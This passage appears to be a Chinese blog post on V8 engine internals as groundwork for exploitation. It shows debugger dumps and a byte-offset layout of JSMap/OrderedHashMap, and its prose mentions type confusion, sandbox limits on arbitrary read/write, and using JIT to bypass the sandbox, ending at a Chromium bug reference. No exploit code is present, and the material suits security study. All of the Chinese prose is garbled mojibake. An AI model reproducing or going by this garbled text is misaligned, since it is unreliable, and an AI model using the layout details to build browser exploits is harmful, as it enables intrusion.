<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>Map</code> Â∞ÜÊèê‰æõÂ±ûÊÄßÂÄºÂú®Áõ∏Â∫îÂå∫Âüü‰∏≠ÁöÑÁ°ÆÂàá‰ΩçÁΩÆ</li>
</ul>
<p>Êú¨Ë¥®‰∏äÔºåÊò†Â∞ÑÂÆö‰πâ‰∫ÜÂ∫îÂ¶Ç‰ΩïËÆøÈóÆÂØπË±°Ôºö</p>
<ul>
<li>ÂØπ‰∫éÂØπË±°Êï∞ÁªÑÔºöÂ≠òÂÇ®ÁöÑÊòØÊØè‰∏™ÂØπË±°ÁöÑÂú∞ÂùÄ</li>
<li>ÂØπ‰∫éÊµÆÁÇπÊï∞ÁªÑÔºö‰ª•ÊµÆÁÇπÊï∞ÂΩ¢ÂºèÂ≠òÂÇ®Êï∞ÂÄº</li>
</ul>
<p>Â¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ <code>Map</code> ‰∏≠Êüê‰∫õÂèòÈáèÁöÑÊï∞ÊçÆÁ±ªÂûãÔºåÂ∞±ÂèØ‰ª•ËææÂà∞Á±ªÂûãÊ∑∑Ê∑ÜÁöÑÊïàÊûú</p>
<p><strong>JavaScript Map ÂØπË±°ÂéüÁêÜ</strong></p>
<p>ÂÖàÈöè‰æøÊâìÂç∞‰∏Ä‰∏™ <code>Map</code> ÁöÑÂÜÖÂ≠ò‰ø°ÊÅØÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x21100004b9d1</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x2110001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x21100004b9e1</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x2110001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x2110000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2110001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x2110000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x2110001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x2110001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x2110000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂíåÂØπË±° JS_OBJECT_TYPE Áõ∏ÊØîÔºåJSMap Â§ö‰∫Ü‰∏Ä‰∏™ <code>table</code> Â±ûÊÄßÔºåËøô‰∏™Â±ûÊÄßÊòØ‰∏Ä‰∏™ OrderedHashMap È°∫Â∫èÂìàÂ∏åË°®</li>
</ul>
<p><code>Map</code> ÊòØÂü∫‰∫éÂìàÂ∏åË°®ÂÆûÁé∞ÁöÑÔºå‰ΩÜÂìàÂ∏åË°®‰∏çÊèê‰æõ‰ªª‰ΩïËø≠‰ª£È°∫Â∫è‰øùËØÅÔºåËÄå ES6 ËßÑËåÉË¶ÅÊ±ÇÂÆûÁé∞Âú®Ëø≠‰ª£ <code>Map</code> Êó∂‰øùÊåÅÊèíÂÖ•È°∫Â∫èÔºåÂõ†Ê≠§Ôºå‚ÄúÁªèÂÖ∏‚ÄùÁÆóÊ≥ï‰∏çÈÄÇÂêà <code>Map</code></p>
<p>V8 ‰ΩøÁî®‰∫ÜÁ°ÆÂÆöÊÄßÂìàÂ∏åË°®ÁÆóÊ≥ïÔºàÈ°∫Â∫èÂìàÂ∏åË°®ÔºâÔºå‰ª•‰∏ãÊòæÁ§∫‰∫ÜÊ≠§ÁÆóÊ≥ï‰ΩøÁî®ÁöÑ‰∏ªË¶ÅÊï∞ÊçÆÁªìÊûÑÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span> </span>&#123; <span class="comment">/* buckets */</span></span><br><span class="line">    key: any;</span><br><span class="line">    value: any;</span><br><span class="line">    chain: number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">CloseTable</span> </span>&#123; <span class="comment">/* table */</span></span><br><span class="line">    hashTable: number[];</span><br><span class="line">    dataTable: Entry[];</span><br><span class="line">    nextSlot: number;</span><br><span class="line">    size: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>CloseTable Êé•Âè£‰ª£Ë°®‰∫ÜÂìàÂ∏åË°®ÔºåÂåÖÂê´Ôºö<ul>
<li>hashTableÔºöÂìàÂ∏åË°®Êï∞ÁªÑÔºàÂ§ßÂ∞èÁ≠â‰∫é‚ÄúÂ≠òÂÇ®Ê°∂‚ÄùÁöÑÊï∞ÈáèÔºâ</li>
<li>dataTableÔºöÂåÖÂê´ÊåâÊèíÂÖ•È°∫Â∫èÊéíÂàóÁöÑÊù°ÁõÆ</li>
</ul>
</li>
<li>Entry Êé•Âè£‰ª£Ë°®‚ÄúÂ≠òÂÇ®Ê°∂‚Äù<ul>
<li>key/valueÔºöÈîÆÂÄºÂØπ</li>
<li>chainÔºöÈìæÂ±ûÊÄßÔºàÊåáÂêëÂ≠òÂÇ® Entry ÁöÑ‰∏ã‰∏Ä‰∏™Êù°ÁõÆÔºâ</li>
<li>nextSlotÔºöÁî®‰∫éÁ¥¢ÂºïÂà∞ dataTable ‰∏≠</li>
</ul>
</li>
</ul>
<p>ÂÖ∑‰ΩìÁöÑÊìç‰ΩúÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÊØèÊ¨°Â∞ÜÊñ∞Êù°ÁõÆÊèíÂÖ•Ë°®‰∏≠Êó∂ÔºåÂÆÉÈÉΩ‰ºöÂ≠òÂÇ®Âú® nextSlot Á¥¢Âºï‰∏ãÁöÑ dataTable Êï∞ÁªÑ‰∏≠ÔºàÊèíÂÖ•ÁöÑÊù°ÁõÆÂ∞ÜÊàê‰∏∫Êñ∞ÁöÑÂ∞æÈÉ®Ôºâ</li>
<li>ÂΩì‰∏Ä‰∏™Êù°ÁõÆ‰ªéÂìàÂ∏åË°® hashTable ‰∏≠Âà†Èô§Êó∂ÔºåÂÆÉ‰πü‰ºö‰ªéÊï∞ÊçÆË°® dataTable ‰∏≠Âà†Èô§Ôºå‰ΩÜÂ∑≤Âà†Èô§ÁöÑÊù°ÁõÆ‰ªç‰ºöÂç†Áî®Êï∞ÊçÆË°®‰∏≠ÁöÑÁ©∫Èó¥ÔºàÁî® hole ËøõË°åÂ°´ÂÖÖÔºâ</li>
<li>ÂΩì‰∏Ä‰∏™Ë°®ÂÖÖÊª°‰∫ÜÊù°ÁõÆÔºàÂåÖÊã¨Â≠òÂú®ÁöÑÂíåÂ∑≤Âà†Èô§ÁöÑÔºâÊó∂ÔºåÈúÄË¶ÅÁî®Êõ¥Â§ßÔºàÊàñÊõ¥Â∞èÔºâÁöÑÂ§ßÂ∞èÈáçÊñ∞Êï£ÂàóÔºàÈáçÂª∫Ôºâ</li>
</ul>
<p>‰ΩøÁî®ËøôÁßçÊñπÊ≥ïÔºåÂØπ <code>Map</code> ËøõË°åËø≠‰ª£Âè™ÈúÄÈÅçÂéÜÊï∞ÊçÆË°®Âç≥ÂèØÔºåËøô‰øùËØÅ‰∫ÜËø≠‰ª£ÁöÑÊèíÂÖ•È°∫Â∫èË¶ÅÊ±Ç</p>
<p>ÊµãËØïÊ°à‰æãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">map.set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâßË°å‰∏§‰∏™ <code>set</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">2</span> <span class="comment">/* ÂÖÉÁ¥†‰∏™Êï∞ */</span></span><br><span class="line"> - deleted: <span class="number">0</span> <span class="comment">/* Âà†Èô§‰∏™Êï∞ */</span></span><br><span class="line"> - buckets: <span class="number">2</span> <span class="comment">/* Â∑≤‰ΩøÁî®ÁöÑÂ≠òÂÇ®Ê°∂‰∏™Êï∞ */</span></span><br><span class="line"> - capacity: <span class="number">4</span> <span class="comment">/* mapÂÆπÈáè(capacity/2Â∞±ÊòØÂΩìÂâçÂèØ‰ª•ÂÆπÁ∫≥ÁöÑÊúÄÂ§ßbucketÊï∞ÁõÆ) */</span></span><br><span class="line"> - buckets: &#123; <span class="comment">/* Â≠òÂÇ®Ê°∂ */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* ÂÖÉÁ¥† */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">1</span> -&gt; <span class="number">0x1d830000407d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#a&gt;</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁÑ∂ÂêéÊâßË°å‰∏Ä‰∏™ <code>delete</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">1</span></span><br><span class="line"> - deleted: <span class="number">1</span></span><br><span class="line"> - buckets: <span class="number">2</span></span><br><span class="line"> - capacity: <span class="number">4</span> </span><br><span class="line"> - buckets: &#123;  <span class="comment">/* Â≠òÂÇ®Ê°∂‰∏çÂáèÂ∞ë */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* ÂÖÉÁ¥†ÂáèÂ∞ë */</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂØπË±° JSMap ÁöÑËØ¶ÁªÜ‰ø°ÊÅØÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(<span class="built_in">map</span>);  </span><br><span class="line">DebugPrint: <span class="number">0x1d830004b9c9</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1d83001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x1d830004b9d9</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1d83001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1d83000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1d83001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1d83000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1d83001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1d83001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1d83000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ <code>table</code> Â±ûÊÄßÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x1d830004b9d9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x1d830004b9d8</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x1d830004b9e8</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span>	<span class="number">0x00002459</span></span><br><span class="line"><span class="number">0x1d830004b9f8</span>:	<span class="number">0x00002459</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span>	<span class="number">0x0000408d</span></span><br><span class="line"><span class="number">0x1d830004ba08</span>:	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x1d830004ba18</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00002459</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d8300002459</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x000023e1</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d83000023e1</span>: [Oddball] in ReadOnlySpace: <span class="meta">#undefined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Êï¥Êï∞Âú® V8 ‰∏≠Ë°®Á§∫‰∏∫Ââç31‰ΩçÔºåÊúÄÂêé‰∏Ä‰Ωç‰∏ç‰ΩøÁî®ÔºàËøôÂ∞±ÊòØ‚Äú0x1‚ÄùË°®Á§∫‰∏∫‚Äú0x2‚ÄùÔºå‚Äú0xfffffffe‚ÄùË°®Á§∫‚Äú-1‚ÄùÁöÑÂéüÂõ†Ôºâ</li>
<li>hole Âú®Êú¨Á®ãÂ∫è‰∏≠Áî® <code>0x00002459</code> Ë°®Á§∫</li>
<li>undefined Âú®Êú¨Á®ãÂ∫è‰∏≠Áî® <code>0x000023e1</code> Ë°®Á§∫</li>
</ul>
<p>ËÆ∞ÂΩï OrderedHashMap ÁöÑ‰∏Ä‰∫õÈáçË¶ÅÂÖÉÊï∞ÊçÆÁöÑÁ≤óÁï•Â∏ÉÂ±ÄÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table + <span class="number">0x10</span> =&gt; Map capacity (<span class="number">0x4</span>) </span><br><span class="line">table + <span class="number">0x14</span> =&gt; Bucket<span class="number">-0</span> data <span class="comment">/* 0 */</span></span><br><span class="line">table + <span class="number">0x18</span> =&gt; Bucket<span class="number">-1</span> data <span class="comment">/* 1 */</span></span><br><span class="line">table + <span class="number">0x1c</span> =&gt; Entry<span class="number">-0</span> key (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x20</span> =&gt; Entry<span class="number">-0</span> value (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x24</span> =&gt; Entry<span class="number">-0</span> next_ptr</span><br><span class="line">table + <span class="number">0x28</span> =&gt; Entry<span class="number">-1</span> key (<span class="number">0x00000004</span>) <span class="comment">/* 2 */</span></span><br><span class="line">table + <span class="number">0x2c</span> =&gt; Entry<span class="number">-1</span> value (<span class="number">0x0000408d</span>) <span class="comment">/* #b */</span></span><br><span class="line">table + <span class="number">0x30</span> =&gt; Entry<span class="number">-1</span> next_ptr</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÈ¢ÑÁïô <code>0x4 * capacity/2</code> ÁöÑÁ©∫Èó¥Áî®‰∫éÂ°´ÂÖÖ Bucket dataÔºàÂ≠òÂÇ®Ê°∂Êï∞ÊçÆÔºâ</li>
<li>‰πãÂêéÁöÑÁ©∫Èó¥‰ºö‰ª• <code>0x4 * 3</code> ‰∏∫Âçï‰ΩçÊù•ÂÇ®Â≠òÂêÑ‰∏™ <code>Entry</code> ‰ø°ÊÅØ</li>
<li>Ë¢´ <code>delete</code> ÊñπÊ≥ïÂà†Èô§ÁöÑÂå∫ÂüüÈúÄË¶ÅÁî® hole Â°´ÂÖÖ</li>
<li>ËÄå‰πãÂêéÁöÑÁ©∫Èó¥ÂàôË¢´ undefined Â°´ÂÖÖ</li>
</ul>
<p><strong>JavaScript SandBox &amp; JIT</strong></p>
<p>ÂØπ‰∫é JavaScript Êù•ËØ¥ÔºåÊ≤ôÁÆ±Âπ∂Èùû‰º†ÁªüÊÑè‰πâ‰∏äÁöÑÊ≤ôÁÆ±ÔºåÂÆÉÂè™ÊòØ‰∏ÄÁßçËØ≠Ê≥ï‰∏äÁöÑ Hack ÂÜôÊ≥ïÔºåÊ≤ôÁÆ±ÊòØ‰∏ÄÁßçÂÆâÂÖ®Êú∫Âà∂ÔºåÊää‰∏Ä‰∫õ‰∏ç‰ø°‰ªªÁöÑ‰ª£Á†ÅËøêË°åÂú®Ê≤ôÁÆ±‰πãÂÜÖÔºå‰ΩøÂÖ∂‰∏çËÉΩËÆøÈóÆÊ≤ôÁÆ±‰πãÂ§ñÁöÑ‰ª£Á†Å </p>
<p>ÂΩìÈúÄË¶ÅËß£ÊûêÊàñËÄÖÊâßË°å‰∏çÂèØ‰ø°ÁöÑ JavaScript ‰ª£Á†ÅÊó∂ÔºåÈúÄË¶ÅÈöîÁ¶ªË¢´ÊâßË°å‰ª£Á†ÅÁöÑÊâßË°åÁéØÂ¢ÉÔºåÂπ∂ÂØπÊâßË°å‰ª£Á†Å‰∏≠ÂèØËÆøÈóÆÂØπË±°ËøõË°åÈôêÂà∂ÔºåÈÄöÂ∏∏ÂºÄÂßãÂèØ‰ª•Êää JavaScript ‰∏≠Â§ÑÁêÜÊ®°Âùó‰æùËµñÂÖ≥Á≥ªÁöÑÈó≠ÂåÖÁß∞‰πã‰∏∫Ê≤ôÁÆ±</p>
<p>Êàë‰ª¨Â§ßËá¥ÂèØ‰ª•ÊääÊ≤ôÁÆ±ÁöÑÂÆûÁé∞ÊÄª‰ΩìÂàÜ‰∏∫‰∏§‰∏™ÈÉ®ÂàÜÔºö</p>
<ul>
<li>ÊûÑÂª∫‰∏Ä‰∏™Èó≠ÂåÖÁéØÂ¢É</li>
<li>Ê®°ÊãüÂéüÁîüÊµèËßàÂô®ÂØπË±°</li>
</ul>
<p>‰∏Ä‰∏™ÈáçË¶ÅÁöÑ‰øùÊä§ÊòØÔºåÂÆÉÂ∞ÜÊâÄÊúâÂ§ñÈÉ®ÊåáÈíàËΩ¨Êç¢‰∏∫Êü•ÊâæË°®ÁöÑÁ¥¢ÂºïÔºå‰æãÂ¶ÇÊåáÂêë Web Á®ãÂ∫èÈõÜ RWX È°µÁöÑÊåáÈíàÂíå ArrayBuffer ÂêéÂ§áÂ≠òÂÇ®ÁöÑÊåáÈíàÔºåÂõ†Ê≠§ÔºåÊàë‰ª¨‰∏çËÉΩ‰ΩøÁî®ÊôÆÈÄöÊñπÊ≥ïÊù•ÂÆûÁé∞‰ªªÊÑèËØªÂÜô</p>
<p>ËÄå JavaScript JITÔºàJust-In-TimeÔºâÂàôÊòØÂè¶‰∏ÄÁßçÊú∫Âà∂Ôºö</p>
<p>JIT compiler Ê∑∑Âêà‰∫ÜÁºñËØëÂô®ÂíåËß£ÈáäÂô®ÁöÑ‰ºòÁÇπÔºåÂ§ßÂπÖÊèêÈ´ò‰∫Ü JavaScript ÁöÑËøêË°åÈÄüÂ∫¶Ôºö</p>
<ul>
<li>‰∏ÄÂºÄÂßãÂè™ÊòØÁÆÄÂçïÁöÑ‰ΩøÁî®Ëß£ÈáäÂô®ÊâßË°åÔºåÂΩìÊüê‰∏ÄË°å‰ª£Á†ÅË¢´ÊâßË°å‰∫ÜÂá†Ê¨°ÔºåËøôË°å‰ª£Á†Å‰ºöË¢´Êâì‰∏ä Warm ÁöÑÊ†áÁ≠æÔºåÂΩìÊüê‰∏ÄË°å‰ª£Á†ÅË¢´ÊâßË°å‰∫ÜÂæàÂ§öÊ¨°ÔºåËøôË°å‰ª£Á†Å‰ºöË¢´Êâì‰∏ä Hot ÁöÑÊ†áÁ≠æ </li>
<li>Ë¢´Êâì‰∏ä Warm Ê†áÁ≠æÁöÑ‰ª£Á†Å‰ºöË¢´‰º†Áªô Baseline Compiler ÁºñËØë‰∏îÂÇ®Â≠òÔºåÂêåÊó∂ÊåâÁÖßË°åÊï∞ÂíåÂèòÈáèÁ±ªÂûãË¢´Á¥¢Âºï</li>
<li>Ë¢´Êâì‰∏ä Hot Ê†áÁ≠æÁöÑ‰ª£Á†Å‰ºöË¢´‰º†Áªô Optimizing compilerÔºåËøôÈáå‰ºöÂØπËøôÈÉ®ÂàÜÂ∏¶Á†ÅÂÅöÊõ¥‰ºòÂåñÁöÑÁºñËØë </li>
<li>ÂΩìÂèëÁé∞ÊâßË°åÁöÑ‰ª£Á†ÅÂëΩ‰∏≠Á¥¢ÂºïÔºå‰ºöÁõ¥Êé•ÂèñÂá∫ÁºñËØëÂêéÁöÑ‰ª£Á†ÅÊâßË°åÔºå‰ªéËÄå‰∏çÈúÄË¶ÅÈáçÂ§çÁºñËØëÂ∑≤ÁªèÁºñËØëËøáÁöÑ‰ª£Á†Å</li>
</ul>
<p>Âà©Áî® JIT Êú∫Âà∂Â∞±ÂèØ‰ª•ÁªïËøá SandBox</p>
<p><strong>Â≠¶‰π†Áõ∏ÂÖ≥ POC</strong></p>
<p>Âú® path ‰∏≠ÁªôÂá∫‰∫Ü‰∏ÄÁØáÊñáÁ´† <code>crbug.com/1263462</code> ÂÖàÂ≠¶‰π†ÂÆÉ</p>
